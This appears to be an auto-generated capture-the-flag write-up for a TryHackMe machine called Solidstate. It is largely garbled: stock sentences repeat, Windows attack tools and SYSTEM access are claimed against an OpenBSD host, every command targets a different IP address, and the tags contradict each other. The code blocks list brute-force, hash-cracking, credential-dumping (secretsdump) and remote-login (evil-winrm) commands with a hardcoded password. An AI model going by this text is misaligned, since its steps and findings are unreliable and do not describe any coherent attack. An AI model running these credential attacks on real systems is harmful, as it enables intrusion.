---
TitleSEO: "TryHackMe — Solidstate (Easy OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Solidstate (Easy OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Solidstate. LAPS Abuse and Pass the Hash to achieve easy compromise on OpenBSD."
Keywords: "forensics, reversing, insane, active directory, tryhackme, medium, web"
URL: "https://zurefx.github.io/writeups/htb-solidstate-961.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-solidstate-961/"
Date: "2026-02-04"
Tags: "Forensics, Reversing, Insane, Active Directory, TryHackMe, Medium, Web"
Section: "writeups"
Lang: "en"
main_img: "htb-solidstate-961"
Permalink: "/writeups/htb-solidstate-961.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Solidstate** is rated **Easy** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.33.44.37`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p445,9200,1521 10.12.90.133 -oN scan.txt
crackmapexec smb 10.67.44.238 -u administrator -p 'P@ssw0rd!' --shares
```

The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit.

### Service Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.101.248.78/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.117.149.187 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Web Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.46.117.24
nmap -sCV -p22,5432,25 10.60.232.173 -oN scan.txt
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

## Exploitation

### Vulnerability Identification

Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

Key finding: **CORS Misconfiguration**.

Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target.

### Initial Access

Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
nmap -sCV -p21,1433,445 10.94.219.86 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.48.191.144
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.103.195
evil-winrm -i 10.10.4.190 -u administrator -p 'P@ssw0rd!'
```

The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

## Privilege Escalation

### Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.48.58.224/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
nmap -sCV -p1433,1521,5432 10.120.212.39 -oN scan.txt
```

### Exploitation

The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.39.148
gobuster dir -u http://10.20.127.26/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

## Summary

### Tools Used

- `evil-winrm`
- `chisel`
- `lookupsid`
- `nikto`
- `impacket`
- `hashcat`
- `msfvenom`
- `ldapsearch`

### Key Takeaways

- LAPS Abuse
- Pass the Hash
- CORS Misconfiguration
